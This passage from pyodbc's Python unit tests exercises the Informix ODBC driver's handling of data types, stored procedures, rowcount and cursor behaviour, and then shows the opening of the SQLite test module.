            self._test_strtype('nvarchar', value, len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_unicode_%s' % len(value)] = _maketest(value)

    def test_unicode_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # binary
    #

    def test_null_binary(self):
        self._test_strtype('varbinary', None, 100)
     
    def test_large_null_binary(self):
        # Bug 1575064
        self._test_strtype('varbinary', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', buffer(value), len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_binary_%s' % len(value)] = _maketest(value)

    #
    # image
    #

    def test_image_null(self):
        self._test_strliketype('image', None)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('image', buffer(value))
        return t
    for value in IMAGE_FENCEPOSTS:
        locals()['test_image_%s' % len(value)] = _maketest(value)

    def test_image_upperlatin(self):
        self._test_strliketype('image', buffer('�'))

    #
    # text
    #

    # def test_empty_text(self):
    #     self._test_strliketype('text', buffer(''))

    def test_null_text(self):
        self._test_strliketype('text', None)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('text', value)
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strliketype('text', '�')

    #
    # bit
    #

    def test_bit(self):
        value = True
        self.cursor.execute(""create table t1(b bit)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        v = self.cursor.execute(""select b from t1"").fetchone()[0]
        self.assertEqual(type(v), bool)
        self.assertEqual(v, value)

    #
    # decimal
    #

    def _decimal(self, precision, scale, negative):
        # From test provided by planders (thanks!) in Issue 91

        self.cursor.execute(""create table t1(d decimal(%s, %s))"" % (precision, scale))

        # Construct a decimal that uses the maximum precision and scale.
        decStr = '9' * (precision - scale)
        if scale:
            decStr = decStr + ""."" + '9' * scale
        if negative:
            decStr = ""-"" + decStr
        value = Decimal(decStr)

        self.cursor.execute(""insert into t1 values(?)"", value)

        v = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def _maketest(p, s, n):
        def t(self):
            self._decimal(p, s, n)
        return t
    for (p, s, n) in [ (1,  0,  False),
                       (1,  0,  True),
                       (6,  0,  False),
                       (6,  2,  False),
                       (6,  4,  True),
                       (6,  6,  True),
                       (38, 0,  False),
                       (38, 10, False),
                       (38, 38, False),
                       (38, 0,  True),
                       (38, 10, True),
                       (38, 38, True) ]:
        locals()['test_decimal_%s_%s_%s' % (p, s, n and 'n' or 'p')] = _maketest(p, s, n)


    def test_decimal_e(self):
        """"""Ensure exponential notation decimals are properly handled""""""
        value = Decimal((0, (1, 2, 3), 5)) # prints as 1.23E+7
        self.cursor.execute(""create table t1(d decimal(10, 2))"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_fixed_str(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")
        
    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    def test_datetime_fraction(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds, so the most granular datetime
        # supported is xxx000.

        value = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(result, value)

    def test_datetime_fraction_rounded(self):
        # SQL Server supports milliseconds, but Python's datetime supports nanoseconds.  pyodbc rounds down to what the
        # database supports.

        full    = datetime(2007, 1, 15, 3, 4, 5, 123456)
        rounded = datetime(2007, 1, 15, 3, 4, 5, 123000)
     
        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", full)
     
        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), datetime)
        self.assertEqual(result, rounded)

    def test_date(self):
        value = date.today()
     
        self.cursor.execute(""create table t1(d date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
     
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(type(value), date)
        self.assertEqual(value, result)

    def test_time(self):
        value = datetime.now().time()
        
        # We aren't yet writing values using the new extended time type so the value written to the database is only
        # down to the second.
        value = value.replace(microsecond=0)
         
        self.cursor.execute(""create table t1(t time)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
         
        result = self.cursor.execute(""select t from t1"").fetchone()[0]
        self.assertEqual(type(value), time)
        self.assertEqual(value, result)

    def test_datetime2(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime2)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(value), datetime)
        self.assertEqual(value, result)

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)


    #
    # stored procedures
    #

    # def test_callproc(self):
    #     ""callproc with a simple input-only stored procedure""
    #     pass

    def test_sp_results(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              select top 10 name, id, xtype, refdate
              from sysobjects
            """""")
        rows = self.cursor.execute(""exec proc1"").fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_temp(self):

        # Note: I've used ""set nocount on"" so that we don't get the number of rows deleted from #tmptable.
        # If you don't do this, you'd need to call nextset() once to skip it.

        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              select top 10 name, id, xtype, refdate
              into #tmptable
              from sysobjects

              select * from #tmptable
            """""")
        self.cursor.execute(""exec proc1"")
        self.assertTrue(self.cursor.description is not None)
        self.assertTrue(len(self.cursor.description) == 4)

        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)


    def test_sp_results_from_vartbl(self):
        self.cursor.execute(
            """"""
            Create procedure proc1
            AS
              set nocount on
              declare @tmptbl table(name varchar(100), id int, xtype varchar(4), refdate datetime)

              insert into @tmptbl
              select top 10 name, id, xtype, refdate
              from sysobjects

              select * from @tmptbl
            """""")
        self.cursor.execute(""exec proc1"")
        rows = self.cursor.fetchall()
        self.assertEqual(type(rows), list)
        self.assertEqual(len(rows), 10) # there has to be at least 10 items in sysobjects
        self.assertEqual(type(rows[0].refdate), datetime)

    def test_sp_with_dates(self):
        # Reported in the forums that passing two datetimes to a stored procedure doesn't work.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@d1 datetime, @d2 datetime)
            AS
              declare @d as int
              set @d = datediff(year, @d1, @d2)
              select @d
            """""")
        self.cursor.execute(""exec test_sp ?, ?"", datetime.now(), datetime.now())
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == 0)   # 0 years apart

    def test_sp_with_none(self):
        # Reported in the forums that passing None caused an error.
        self.cursor.execute(
            """"""
            if exists (select * from dbo.sysobjects where id = object_id(N'[test_sp]') and OBJECTPROPERTY(id, N'IsProcedure') = 1)
              drop procedure [dbo].[test_sp]
            """""")
        self.cursor.execute(
            """"""
            create procedure test_sp(@x varchar(20))
            AS
              declare @y varchar(20)
              set @y = @x
              select @y
            """""")
        self.cursor.execute(""exec test_sp ?"", None)
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(rows[0][0] == None)   # 0 years apart
        

    #
    # rowcount
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount, but SQL Server 2005 returns -1 after a
        select statement, so we'll test for that behavior.  This is valid behavior according to the DB API
        specification, but people don't seem to like it.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, -1)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, -1)

    def test_rowcount_reset(self):
        ""Ensure rowcount is reset to -1""

        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.assertEqual(self.cursor.rowcount, 1)

        self.cursor.execute(""create table t2(i int)"")
        self.assertEqual(self.cursor.rowcount, -1)

    #
    # always return Cursor
    #

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_temp_select(self):
        # A project was failing to create temporary tables via select into.
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")

        self.cursor.execute(""select s into t2 from t1"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(v, ""testing"")


    def test_money(self):
        d = Decimal('123456.78')
        self.cursor.execute(""create table t1(i int identity(1,1), m money)"")
        self.cursor.execute(""insert into t1(m) values (?)"", d)
        v = self.cursor.execute(""select m from t1"").fetchone()[0]
        self.assertEqual(v, d)


    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_concatenation(self):
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(300), c3 varchar(300))"")
        self.cursor.execute(""insert into t1(c2, c3) values (?,?)"", v2, v3)

        row = self.cursor.execute(""select c2, c3, c2 + c3 as both from t1"").fetchone()

        self.assertEqual(row.both, v2 + v3)

    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')


    def test_informix_callproc(self):
        try:
            self.cursor.execute(""drop procedure pyodbctest"")
            self.cnxn.commit()
        except:
            pass

        self.cursor.execute(""create table t1(s varchar(10))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")

        self.cursor.execute(""""""
                            create procedure pyodbctest @var1 varchar(32)
                            as 
                            begin 
                              select s 
                              from t1 
                            return 
                            end
                            """""")
        self.cnxn.commit()

        # for row in self.cursor.procedureColumns('pyodbctest'):
        #     print row.procedure_name, row.column_name, row.column_type, row.type_name

        self.cursor.execute(""exec pyodbctest 'hi'"")

        # print self.cursor.description
        # for row in self.cursor:
        #     print row.s

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_timeout(self):
        self.assertEqual(self.cnxn.timeout, 0) # defaults to zero (off)

        self.cnxn.timeout = 30
        self.assertEqual(self.cnxn.timeout, 30)

        self.cnxn.timeout = 0
        self.assertEqual(self.cnxn.timeout, 0)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s varchar(8), d decimal(5,2))"")
        self.cursor.execute(""insert into t1 values (1, 'abc', '1.23')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # varchar(8)
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[4], 8)       # precision
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # decimal(5, 2)
        t = self.cursor.description[2]
        self.assertEqual(t[0], 'd')
        self.assertEqual(t[1], Decimal)
        self.assertEqual(t[4], 5)       # precision
        self.assertEqual(t[5], 2)       # scale
        self.assertEqual(t[6], True)    # nullable

        
    def test_none_param(self):
        ""Ensure None can be used for params other than the first""
        # Some driver/db versions would fail if NULL was not the first parameter because SQLDescribeParam (only used
        # with NULL) could not be used after the first call to SQLBindParameter.  This means None always worked for the
        # first column, but did not work for later columns.
        #
        # If SQLDescribeParam doesn't work, pyodbc would use VARCHAR which almost always worked.  However,
        # binary/varbinary won't allow an implicit conversion.

        self.cursor.execute(""create table t1(n int, blob varbinary(max))"")
        self.cursor.execute(""insert into t1 values (1, newid())"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 1)
        self.assertEqual(type(row.blob), buffer)

        self.cursor.execute(""update t1 set n=?, blob=?"", 2, None)
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 2)
        self.assertEqual(row.blob, None)


    def test_output_conversion(self):
        def convert(value):
            # `value` will be a string.  We'll simply add an X at the beginning at the end.
            return 'X' + value + 'X'
        self.cnxn.add_output_converter(pyodbc.SQL_VARCHAR, convert)
        self.cursor.execute(""create table t1(n int, v varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, '123.45')"")
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, 'X123.45X')

        # Now clear the conversions and try again.  There should be no Xs this time.
        self.cnxn.clear_output_converters()
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, '123.45')


    def test_too_large(self):
        """"""Ensure error raised if insert fails due to truncation""""""
        value = 'x' * 1000
        self.cursor.execute(""create table t1(s varchar(800))"")
        def test():
            self.cursor.execute(""insert into t1 values (?)"", value)
        self.assertRaises(pyodbc.DataError, test)

    def test_geometry_null_insert(self):
        def convert(value):
            return value

        self.cnxn.add_output_converter(-151, convert) # -151 is SQL Server's geometry
        self.cursor.execute(""create table t1(n int, v geometry)"")
        self.cursor.execute(""insert into t1 values (?, ?)"", 1, None)
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, None)
        self.cnxn.clear_output_converters()

    def test_login_timeout(self):
        # This can only test setting since there isn't a way to cause it to block on the server side.
        cnxns = pyodbc.connect(self.connection_string, timeout=2)

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def test_context_manager(self):
        with pyodbc.connect(self.connection_string) as cnxn:
            cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)

        # The connection should be closed now.
        def test():
            cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertRaises(pyodbc.ProgrammingError, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a varbinary(max))')
        hundredkb = buffer('x'*100*1024)
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_func_param(self):
        self.cursor.execute('''
                            create function func1 (@testparam varchar(4)) 
                            returns @rettest table (param varchar(4))
                            as 
                            begin
                                insert @rettest
                                select @testparam
                                return
                            end
                            ''')
        self.cnxn.commit()
        value = self.cursor.execute(""select * from func1(?)"", 'test').fetchone()[0]
        self.assertEqual(value, 'test')
        
    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')

    def test_drivers(self):
        drivers = pyodbc.drivers()
        self.assertEqual(list, type(drivers))
        self.assertTrue(len(drivers) > 1)

        m = re.search('DRIVER={([^}]+)}', self.connection_string, re.IGNORECASE)
        current = m.group(1)
        self.assertTrue(current in drivers)
            
    def test_prepare_cleanup(self):
        # When statement is prepared, it is kept in case the next execute uses the same statement.  This must be
        # removed when a non-execute statement is used that returns results, such as SQLTables.

        self.cursor.execute(""select top 1 name from sysobjects where name = ?"", ""bogus"")
        self.cursor.fetchone()

        self.cursor.tables(""bogus"")
        
        self.cursor.execute(""select top 1 name from sysobjects where name = ?"", ""bogus"")
        self.cursor.fetchone()


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('informixtests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(InformixTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests2/sqlitetests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQLite using the ODBC driver from http://www.ch-werner.de/sqliteodbc

To use, pass a connection string as the parameter. The tests will create and
drop tables t1 and t2 as necessary.  On Windows, use the 32-bit driver with
32-bit Python and the 64-bit driver with 64-bit Python (regardless of your
operating system bitness).

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [sqlitetests]
  connection-string=Driver=SQLite3 ODBC Driver;Database=sqlite.db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
